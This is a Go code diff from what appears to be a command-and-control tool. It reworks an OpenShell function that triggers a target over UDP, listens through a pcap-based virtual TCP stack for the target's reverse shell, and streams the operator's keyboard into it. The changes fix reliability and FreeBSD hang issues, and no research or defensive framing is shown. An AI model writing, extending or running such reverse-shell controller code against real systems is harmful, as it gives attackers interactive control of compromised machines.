@@ -110,6 +110,7 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
+// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
@@ -122,58 +123,64 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	// ========= PCAP TCP STACK ==========
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
+
 	setupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
 	defer cancel()
+
 	pool, err := netip.ParsePrefix("172.16.0.0/16")
 	if err != nil {
 		return fmt.Errorf("invalid -subnet: %w", err)
 	}
+
+	// FIXED: Use the pool's gateway IP as the VirtualIP, NOT the local host adapter IP
+	virtualIP := pool.Addr()
+
 	addr := network.LocalIP().IP
 	localIP, _ := netip.AddrFromSlice(addr)
 	device, err := network.GetNetworkInterface(addr)
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
 	}
-	virtualIP, err := netip.ParseAddr("172.16.0.1")
-	if err != nil {
-		return fmt.Errorf("invalid virtual ip: %w", err)
-	}
+
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
+	
 	var listener *pcapnet.TCPServer
 	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
-	defer listener.Close() // Close listener when function returns
+	defer listener.Close() 
 	// ========= PCAP TCP STACK ==========
 
-	// Channel to capture the incoming connection asynchronously
 	type connResult struct {
 		conn net.Conn
 		err  error
 	}
 	ch := make(chan connResult, 1)
 
-	// Start accepting in the background so we don't miss a fast target response
 	go func() {
 		c, e := listener.Accept()
 		ch <- connResult{conn: c, err: e}
 	}()
 
-	// Listener is running in the background, so we can send the message to the target
 	portStr := strconv.Itoa(srcPort)
 	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
 		return fmt.Errorf("sending shell message: %w", err)
 	}
 
-	// Block until the target connects or an error occurs
-	res := <-ch
+	var res connResult
+	select {
+	case res = <-ch:
+	case <-ctx.Done():
+		return ctx.Err()
+	}
+
 	if res.err != nil {
 		return fmt.Errorf("accepting connection: %w", res.err)
 	}
 	conn := res.conn
-	defer conn.Close() // Close connection once function returns
+	defer conn.Close()
 
 	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr().String())
 
@@ -183,11 +190,21 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		if err != nil {
 			return err
 		}
-		defer term.Restore(int(os.Stdin.Fd()), oldState)
+		defer func() {
+			_ = term.Restore(int(os.Stdin.Fd()), oldState)
+		}()
 	}
 
-	// Channel to cleanly block until the session terminates
 	done := make(chan struct{})
+
+	// FIXED: Explicitly force close the socket if local Ctrl+C hits to unblock io.Copy on FreeBSD
+	go func() {
+		select {
+		case <-ctx.Done():
+			_ = conn.Close()
+		case <-done:
+		}
+	}()
 
 	// Stream incoming target shell output to control terminal
 	go func() {
@@ -196,12 +213,27 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		close(done)
 	}()
 
-	// Stream keyboard straight into the connection
+	// FIXED: Protect against FreeBSD terminal hangs by checking context state inside keyboard loop
 	go func() {
-		_, _ = io.Copy(conn, os.Stdin)
+		buf := make([]byte, 1024)
+		for {
+			select {
+			case <-done:
+				return
+			case <-ctx.Done():
+				return
+			default:
+				n, err := os.Stdin.Read(buf)
+				if n > 0 {
+					_, _ = conn.Write(buf[:n])
+				}
+				if err != nil {
+					return
+				}
+			}
+		}
 	}()
 
-	// Keep OpenShell alive until goroutine signals a disconnect
 	<-done
 	return nil
 }
